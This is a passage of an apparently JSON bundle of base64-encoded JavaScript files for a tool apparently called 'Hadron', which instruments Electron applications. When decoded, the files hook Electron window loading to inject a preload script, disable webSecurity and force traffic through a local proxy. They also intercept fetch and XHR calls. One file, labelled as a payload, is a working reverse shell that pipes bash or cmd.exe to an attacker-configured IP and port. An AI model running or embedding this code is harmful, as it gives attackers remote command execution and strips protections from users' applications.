tZXRob2RzCiAgICAgICAgY29uc3Qgb3JpZ2luYWxMb2FkVVJMID0gQnJvd3NlcldpbmRvdy5wcm90b3R5cGUubG9hZFVSTDsKICAgICAgICBjb25zdCBvcmlnaW5hbExvYWRGaWxlID0gQnJvd3NlcldpbmRvdy5wcm90b3R5cGUubG9hZEZpbGU7CgogICAgICAgIC8vIEhvb2sgbG9hZFVSTCB0byBpbmplY3Qgb3VyIHByZWxvYWQKICAgICAgICBCcm93c2VyV2luZG93LnByb3RvdHlwZS5sb2FkVVJMID0gZnVuY3Rpb24odXJsLCBvcHRpb25zID0ge30pIHsKICAgICAgICAgICAgY29uc29sZS5sb2coJ1tQUk9YWV0gTG9hZGluZyBVUkw6JywgdXJsKTsKICAgICAgICAgICAgaWYgKCFvcHRpb25zLndlYlByZWZlcmVuY2VzKSB7CiAgICAgICAgICAgICAgICBvcHRpb25zLndlYlByZWZlcmVuY2VzID0ge307CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCFvcHRpb25zLndlYlByZWZlcmVuY2VzLnByZWxvYWQpIHsKICAgICAgICAgICAgICAgIG9wdGlvbnMud2ViUHJlZmVyZW5jZXMucHJlbG9hZCA9IHBhdGguam9pbihfX2Rpcm5hbWUsICdwcm94eS1wcmVsb2FkLmpzJyk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgLy8gRGlzYWJsZSB3ZWIgc2VjdXJpdHkgdG8gYWxsb3cgcHJveHlpbmcKICAgICAgICAgICAgb3B0aW9ucy53ZWJQcmVmZXJlbmNlcy53ZWJTZWN1cml0eSA9IGZhbHNlOwogICAgICAgICAgICBvcHRpb25zLndlYlByZWZlcmVuY2VzLmFsbG93UnVubmluZ0luc2VjdXJlQ29udGVudCA9IHRydWU7CiAgICAgICAgICAgIHJldHVybiBvcmlnaW5hbExvYWRVUkwuY2FsbCh0aGlzLCB1cmwsIG9wdGlvbnMpOwogICAgICAgIH07CgogICAgICAgIC8vIEhvb2sgbG9hZEZpbGUgc2ltaWxhcmx5CiAgICAgICAgQnJvd3NlcldpbmRvdy5wcm90b3R5cGUubG9hZEZpbGUgPSBmdW5jdGlvbihmaWxlUGF0aCwgb3B0aW9ucyA9IHt9KSB7CiAgICAgICAgICAgIGNvbnNvbGUubG9nKCdbUFJPWFldIExvYWRpbmcgZmlsZTonLCBmaWxlUGF0aCk7CiAgICAgICAgICAgIGlmICghb3B0aW9ucy53ZWJQcmVmZXJlbmNlcykgewogICAgICAgICAgICAgICAgb3B0aW9ucy53ZWJQcmVmZXJlbmNlcyA9IHt9OwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICghb3B0aW9ucy53ZWJQcmVmZXJlbmNlcy5wcmVsb2FkKSB7CiAgICAgICAgICAgICAgICBvcHRpb25zLndlYlByZWZlcmVuY2VzLnByZWxvYWQgPSBwYXRoLmpvaW4oX19kaXJuYW1lLCAncHJveHktcHJlbG9hZC5qcycpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIC8vIERpc2FibGUgd2ViIHNlY3VyaXR5IHRvIGFsbG93IHByb3h5aW5nCiAgICAgICAgICAgIG9wdGlvbnMud2ViUHJlZmVyZW5jZXMud2ViU2VjdXJpdHkgPSBmYWxzZTsKICAgICAgICAgICAgb3B0aW9ucy53ZWJQcmVmZXJlbmNlcy5hbGxvd1J1bm5pbmdJbnNlY3VyZUNvbnRlbnQgPSB0cnVlOwogICAgICAgICAgICByZXR1cm4gb3JpZ2luYWxMb2FkRmlsZS5jYWxsKHRoaXMsIGZpbGVQYXRoLCBvcHRpb25zKTsKICAgICAgICB9OwoKICAgICAgICAvLyBIb29rIHdpbmRvdyBjcmVhdGlvbgogICAgICAgIGNvbnN0IG9yaWdpbmFsQ3JlYXRlV2luZG93ID0gQnJvd3NlcldpbmRvdy5wcm90b3R5cGUuY29uc3RydWN0b3I7CiAgICAgICAgQnJvd3NlcldpbmRvdy5wcm90b3R5cGUuY29uc3RydWN0b3IgPSBmdW5jdGlvbihvcHRpb25zID0ge30pIHsKICAgICAgICAgICAgY29uc29sZS5sb2coJ1tQUk9YWV0gQ3JlYXRpbmcgbmV3IHdpbmRvdycpOwogICAgICAgICAgICBpZiAoIW9wdGlvbnMud2ViUHJlZmVyZW5jZXMpIHsKICAgICAgICAgICAgICAgIG9wdGlvbnMud2ViUHJlZmVyZW5jZXMgPSB7fTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoIW9wdGlvbnMud2ViUHJlZmVyZW5jZXMucHJlbG9hZCkgewogICAgICAgICAgICAgICAgb3B0aW9ucy53ZWJQcmVmZXJlbmNlcy5wcmVsb2FkID0gcGF0aC5qb2luKF9fZGlybmFtZSwgJ3Byb3h5LXByZWxvYWQuanMnKTsKICAgICAgICAgICAgfQogICAgICAgICAgICAvLyBEaXNhYmxlIHdlYiBzZWN1cml0eSB0byBhbGxvdyBwcm94eWluZwogICAgICAgICAgICBvcHRpb25zLndlYlByZWZlcmVuY2VzLndlYlNlY3VyaXR5ID0gZmFsc2U7CiAgICAgICAgICAgIG9wdGlvbnMud2ViUHJlZmVyZW5jZXMuYWxsb3dSdW5uaW5nSW5zZWN1cmVDb250ZW50ID0gdHJ1ZTsKICAgICAgICAgICAgcmV0dXJuIG5ldyBvcmlnaW5hbENyZWF0ZVdpbmRvdyhvcHRpb25zKTsKICAgICAgICB9OwoKICAgICAgICAvLyBBbHNvIGhvb2sgdGhlIGFwcCdzIHJlYWR5IGV2ZW50IHRvIGVuc3VyZSBvdXIgcHJlbG9hZCBpcyBzZXQKICAgICAgICBhcHAub24oJ3JlYWR5JywgKCkgPT4gewogICAgICAgICAgICAvLyBTZXQgdXAgZ2xvYmFsIHByb3h5IHNldHRpbmdzIGZvciBhbGwgbmV3IHdpbmRvd3MKICAgICAgICAgICAgc2Vzc2lvbi5kZWZhdWx0U2Vzc2lvbi5zZXRQcm94eSh7CiAgICAgICAgICAgICAgICBtb2RlOiAnZml4ZWRfc2VydmVycycsCiAgICAgICAgICAgICAgICBwcm94eVJ1bGVzOiAnaHR0cD1sb2NhbGhvc3Q6ODA4MTtodHRwcz1sb2NhbGhvc3Q6ODA4MScKICAgICAgICAgICAgfSwgKCkgPT4gewogICAgICAgICAgICAgICAgY29uc29sZS5sb2coJ1tQUk9YWV0gR2xvYmFsIHByb3h5IHNldHRpbmdzIGFwcGxpZWQnKTsKICAgICAgICAgICAgfSk7CiAgICAgICAgfSk7CgogICAgICAgIGNvbnNvbGUubG9nKCdbUFJPWFldIE1haW4gcHJvY2VzcyBob29rcyBpbnN0YWxsZWQnKTsKICAgIH0gY2F0Y2goZXJyKSB7CiAgICAgICAgY29uc29sZS5lcnJvcignW1BST1hZXSBNYWluIHByb2Nlc3MgZXJyb3I6JywgZXJyLm1lc3NhZ2UpOwogICAgfQp9KSgpOyA=","proxy-preload.js":"Ly8gUHJlbG9hZCBzY3JpcHQgdG8gaW5qZWN0IHByb3h5IGhvb2tzIGludG8gcmVuZGVyZXIKKGZ1bmN0aW9uKCkgewogICAgdHJ5IHsKICAgICAgICBjb25zdCB7IGNvbnRleHRCcmlkZ2UsIGlwY1JlbmRlcmVyIH0gPSByZXF1aXJlKCdlbGVjdHJvbicpOwogICAgICAgIAogICAgICAgIC8vIEluamVjdCBvdXIgcHJveHkgY29kZSBpbnRvIHRoZSByZW5kZXJlcgogICAgICAgIGNvbnRleHRCcmlkZ2UuZXhwb3NlSW5NYWluV29ybGQoJ19fUFJPWFlfSE9PS19fJywgewogICAgICAgICAgICBpbnN0YWxsOiAoKSA9PiB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZygnW1BST1hZXSBJbnN0YWxsaW5nIHJlbmRlcmVyIGhvb2tzJyk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC8vIEhvb2sgZmV0Y2gKICAgICAgICAgICAgICAgIGNvbnN0IG9yaWdpbmFsRmV0Y2ggPSB3aW5kb3cuZmV0Y2g7CiAgICAgICAgICAgICAgICB3aW5kb3cuZmV0Y2ggPSBhc3luYyBmdW5jdGlvbihpbnB1dCwgaW5pdCkgewogICAgICAgICAgICAgICAgICAgIGNvbnN0IHVybCA9IGlucHV0IGluc3RhbmNlb2YgUmVxdWVzdCA/IGlucHV0LnVybCA6IGlucHV0OwogICAgICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKGBbUFJPWFldIEludGVyY2VwdGVkIGZldGNoOiAke3VybH1gKTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpZiAodXJsLmluY2x1ZGVzKCdsb2NhbGhvc3QnKSB8fCB1cmwuaW5jbHVkZXMoJzEyNy4wLjAuMScpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKCdbUFJPWFldIFNraXBwaW5nIGxvY2FsaG9zdCBmZXRjaCcpOwogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gb3JpZ2luYWxGZXRjaC5jYWxsKHRoaXMsIGlucHV0LCBpbml0KTsKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKCdbUFJPWFldIFByb3h5aW5nIGZldGNoIHJlcXVlc3QnKTsKICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBvcmlnaW5hbEZldGNoLmNhbGwodGhpcywgaW5wdXQsIGluaXQpOwogICAgICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmxvZygnW1BST1hZXSBGZXRjaCByZXNwb25zZTonLCByZXNwb25zZS5zdGF0dXMpOwogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gcmVzcG9uc2U7CiAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICAgICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcihgW1BST1hZXSBGZXRjaCBlcnJvcjogJHtlcnJvci5tZXNzYWdlfWApOwogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gb3JpZ2luYWxGZXRjaC5jYWxsKHRoaXMsIGlucHV0LCBpbml0KTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9OwoKICAgICAgICAgICAgICAgIC8vIEhvb2sgWE1MSHR0cFJlcXVlc3QKICAgICAgICAgICAgICAgIGNvbnN0IG9yaWdpbmFsWEhST3BlbiA9IFhNTEh0dHBSZXF1ZXN0LnByb3RvdHlwZS5vcGVuOwogICAgICAgICAgICAgICAgY29uc3Qgb3JpZ2luYWxYSFJTZW5kID0gWE1MSHR0cFJlcXVlc3QucHJvdG90eXBlLnNlbmQ7CgogICAgICAgICAgICAgICAgWE1MSHR0cFJlcXVlc3QucHJvdG90eXBlLm9wZW4gPSBmdW5jdGlvbihtZXRob2QsIHVybCwgLi4uYXJncykgewogICAgICAgICAgICAgICAgICAgIHRoaXMuX29yaWdpbmFsVXJsID0gdXJsOwogICAgICAgICAgICAgICAgICAgIHRoaXMuX29yaWdpbmFsTWV0aG9kID0gbWV0aG9kOwogICAgICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKGBbUFJPWFldIEludGVyY2VwdGVkIFhIUjogJHt0aGlzLl9vcmlnaW5hbFVybH1gKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gb3JpZ2luYWxYSFJPcGVuLmNhbGwodGhpcywgbWV0aG9kLCB1cmwsIC4uLmFyZ3MpOwogICAgICAgICAgICAgICAgfTsKCiAgICAgICAgICAgICAgICBYTUxIdHRwUmVxdWVzdC5wcm90b3R5cGUuc2VuZCA9IGZ1bmN0aW9uKGRhdGEpIHsKICAgICAgICAgICAgICAgICAgICBpZiAodGhpcy5fb3JpZ2luYWxVcmwpIHsKICAgICAgICAgICAgICAgICAgICAgICAgY29uc29sZS5sb2coYFtQUk9YWV0gU2VuZGluZyBYSFI6ICR7dGhpcy5fb3JpZ2luYWxVcmx9YCk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIHJldHVybiBvcmlnaW5hbFhIUlNlbmQuY2FsbCh0aGlzLCBkYXRhKTsKICAgICAgICAgICAgICAgIH07CgogICAgICAgICAgICAgICAgY29uc29sZS5sb2coJ1tQUk9YWV0gUmVuZGVyZXIgaG9va3MgaW5zdGFsbGVkJyk7CiAgICAgICAgICAgIH0KICAgICAgICB9KTsKCiAgICAgICAgLy8gSW5zdGFsbCBob29rcyBpbW1lZGlhdGVseQogICAgICAgIGlmICh3aW5kb3cuX19QUk9YWV9IT09LX18pIHsKICAgICAgICAgICAgd2luZG93Ll9fUFJPWFlfSE9PS19fLmluc3RhbGwoKTsKICAgICAgICB9CiAgICB9IGNhdGNoKGVycikgewogICAgICAgIGNvbnNvbGUuZXJyb3IoJ1tQUk9YWV0gUHJlbG9hZCBlcnJvcjonLCBlcnIubWVzc2FnZSk7CiAgICB9Cn0pKCk7IA==","simple-reverse-shell.js":"Ly8gSEFEUk9OX1BBWUxPQUQKLy8gU2ltcGxlIFJldmVyc2UgU2hlbGwgLSBObyBibG9jayBjb21tZW50cwovLyBDb25maWd1cmF0aW9uOiBDaGFuZ2UgQVRUQUNLRVJfSVAgYW5kIEFUVEFDS0VSX1BPUlQgYmVsb3cKCi8qIFBBWUxPQURfU1RBUlQgKi8KLy8gUmV2ZXJzZSBTaGVsbCBDb25maWd1cmF0aW9uCnZhciBBVFRBQ0tFUl9JUCA9ICcxMjcuMC4wLjEnOwp2YXIgQVRUQUNLRVJfUE9SVCA9IDQ0NDQ7CgovLyBTaW1wbGUgcmV2ZXJzZSBzaGVsbAooZnVuY3Rpb24oKSB7CiAgdHJ5IHsKICAgIHZhciBuZXQgPSByZXF1aXJlKCduZXQnKTsKICAgIHZhciBzcGF3biA9IHJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5zcGF3bjsKICAgIHZhciBvcyA9IHJlcXVpcmUoJ29zJyk7CiAgICAKICAgIHZhciBjbGllbnQgPSBuZXcgbmV0LlNvY2tldCgpOwogICAgCiAgICBjbGllbnQuY29ubmVjdChBVFRBQ0tFUl9QT1JULCBBVFRBQ0tFUl9JUCwgZnVuY3Rpb24oKSB7CiAgICAgIHZhciBzaGVsbCA9IG9zLnBsYXRmb3JtKCkgPT09ICd3aW4zMicgPyAnY21kLmV4ZScgOiAnL2Jpbi9iYXNoJzsKICAgICAgdmFyIGNoaWxkID0gc3Bhd24oc2hlbGwsIFtdLCB7IHN0ZGlvOiBbJ3BpcGUnLCAncGlwZScsICdwaXBlJ10gfSk7CiAgICAgIAogICAgICBjbGllbnQucGlwZShjaGlsZC5zdGRpbik7CiAgICAgIGNoaWxkLnN0ZG91dC5waXBlKGNsaWVudCk7CiAgICAgIGNoaWxkLnN0ZGVyci5waXBlKGNsaWVudCk7CiAgICAgIAogICAgICBjbGllbnQub24oJ2Nsb3NlJywgZnVuY3Rpb24oKSB7IGNoaWxkLmtpbGwoKTsgfSk7CiAgICAgIGNoaWxkLm9uKCdleGl0JywgZnVuY3Rpb24oKSB7IGNsaWVudC5lbmQoKTsgfSk7CiAgICB9KTsKICAgIAogICAgY2xpZW50Lm9uKCdlcnJvcicsIGZ1bmN0aW9uKGVycikgewogICAgICBjb25zb2xlLmxvZygnU2hlbGwgZXJyb3I6JywgZXJyLm1lc3NhZ2UpOwogICAgfSk7CiAgICAKICB9IGNhdGNoIChlKSB7CiAgICBjb25zb2xlLmxvZygnUGF5bG9hZCBlcnJvcjonLCBlLm1lc3NhZ2UpOwogIH0KfSkoKTsKLyogUEFZTE9BRF9FTkQgKi8=","storage-hook.js":"","utils.js":"Ly8gU2hhcmVkIGxvZ2dpbmcgdXRpbGl0eSBmb3IgYWxsIGhvb2tzCihmdW5jdGlvbigpIHsKICAgIGNvbnN0IGNyeXB0byA9IHJlcXVpcmUoJ2NyeXB0bycpOwogICAgY29uc3QgZnMgPSByZXF1aXJlKCdmcycpOwogICAgY29uc3QgcGF0aCA9IHJlcXVpcmUoJ3BhdGgnKTsKICAgIGNvbnN0IG9zID0gcmVxdWlyZSgnb3MnKTsKCiAgICAvLyBHZW5lcmF0ZSBzZXNzaW9uIElEIGZyb20gdGFyZ2V0IHBhdGgKICAgIGZ1bmN0aW9uIGdlbmVyYXRlU2Vzc2lvbklkKHRhcmdldFBhdGgpIHsKICAgICAgICByZXR1cm4gY3J5cHRvLmNyZWF0ZUhhc2goJ3NoYTI1NicpCiAgICAgICAgICAgIC51cGRhdGUodGFyZ2V0UGF0aCkKICAgICAgICAgICAgLmRpZ2VzdCgnaGV4JykKICAgICAgICAgICAgLnN1YnN0cmluZygwLCA4KTsKICAgIH0KCiAgICAvLyBHZXQgbG9nIGRpcmVjdG9yeSBmb3IgY3VycmVudCBzZXNzaW9uCiAgICBmdW5jdGlvbiBnZXRMb2dEaXIodGFyZ2V0UGF0aCkgewogICAgICAgIGNvbnN0IHNlc3Npb25JZCA9IGdlbmVyYXRlU2Vzc2lvbklkKHRhcmdldFBhdGgpOwogICAgICAgIGNvbnN0IGxvZ0RpciA9IHBhdGguam9pbihvcy5ob21lZGlyKCksICcubG9jYWwnLCAnaGFkcm9uJywgJ2xvZ3MnLCBzZXNzaW9uSWQpOwogICAgICAgIAogICAgICAgIC8vIEVuc3VyZSBsb2cgZGlyZWN0b3J5IGV4aXN0cwogICAgICAgIGlmICghZnMuZXhpc3RzU3luYyhsb2dEaXIpKSB7CiAgICAgICAgICAgIGZzLm1rZGlyU3luYyhsb2dEaXIsIHsgcmVjdXJzaXZlOiB0cnVlIH0pOwogICAgICAgIH0KICAgICAgICAKICAgICAgICByZXR1cm4gbG9nRGlyOwogICAgfQoKICAgIC8vIENyZWF0ZSBsb2dnZXIgZm9yIGEgc3BlY2lmaWMgaG9vawogICAgZnVuY3Rpb24gY3JlYXRlTG9nZ2VyKHRhcmdldFBhdGgsIGhvb2tOYW1lKSB7CiAgICAgICAgY29uc3QgbG9nRGlyID0gZ2V0TG9nRGlyKHRhcmdldFBhdGgpOwogICAgICAgIGNvbnN0IGxvZ0ZpbGUgPSBwYXRoLmpvaW4obG9nRGlyLCBgJHtob29rTmFtZX0uanNvbmApOwogICAgICAgIAogICAgICAgIHJldHVybiB7CiAgICAgICAgICAgIGxvZzogKGRhdGEpID0+IHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgY29uc3QgdGltZXN0YW1wID0gbmV3IERhdGUoKS50b0lTT1N0cmluZygpOwogICAgICAgICAgICAgICAgICAgIGNvbnN0IGxvZ0VudHJ5ID0gewogICAgICAgICAgICAgICAgICAgICAgICB0aW1lc3RhbXAsCiAgICAgICAgICAgICAgICAgICAgICAgIGhvb2s6IGhvb2tOYW1lLAogICAgICAgICAgICAgICAgICAgICAgICAuLi5kYXRhCiAgICAgICAgICAgICAgICAgICAgfTsKICAgICAgICAgICAgICAgICAgICBmcy5hcHBlbmRGaWxlU3luYyhsb2dGaWxlLCBKU09OLnN0cmluZ2lmeShsb2dFbnRyeSkgKyAnXG4nKTsKICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmxvZyhgWyR7aG9va05hbWV9XWAsIGRhdGEpOyAvLyBBbHNvIGxvZyB0byBjb25zb2xlCiAgICAgICAgICAgICAgICB9IGNhdGNoKGUpIHsKICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKGBbJHtob29rTmFtZX1dIExvZyBlcnJvcjpgLCBlLm1lc3NhZ2UpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9LAogICAgICAgICAgICAKICAgICAgICAgICAgLy8gR2V0IHNlc3Npb24gaW5mbwogICAgICAgICAgICBnZXRTZXNzaW9uSW5mbzogKCkgPT4gewogICAgICAgICAgICAgICAgcmV0dXJuIHsKICAgICAgICAgICAgICAgICAgICBzZXNzaW9uSWQ6IGdlbmVyYXRlU2Vzc2lvbklkKHRhcmdldFBhdGgpLAogICAgICAgICAgICAgICAgICAgIGxvZ0RpciwKICAgICAgICAgICAgICAgICAgICB0YXJnZXRQYXRoCiAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICB9CiAgICAgICAgfTsKICAgIH0KCiAgICAvLyBFeHBvcnQgdGhlIHV0aWxpdHkKICAgIGlmICh0eXBlb2YgbW9kdWxlICE9PSAndW5kZWZpbmVkJykgewogICAgICAgIG1vZHVsZS5leHBvcnRzID0gewogICAgICAgICAgICBjcmVhdGVMb2dnZXIsCiAgICAgICAgICAgIGdldExvZ0RpciwKICAgICAgICAgICAgZ2VuZXJhdGVTZXNzaW9uSWQKICAgICAgICB9OwogICAgfSBlbHNlIHsKICAgICAgICB3aW5kb3cuX19IQURST05fTE9HR0VSX18gPSB7CiAgICAgICAgICAgIGNyZWF0ZUxvZ2dlciwKICAgICAgICAgICAgZ2V0TG9nRGlyLAogICAgICAgICAgICBnZW5lcmF0ZVNlc3Npb25JZAogICAgICAgIH07CiAgICB9Cn0pKCk7IA=="}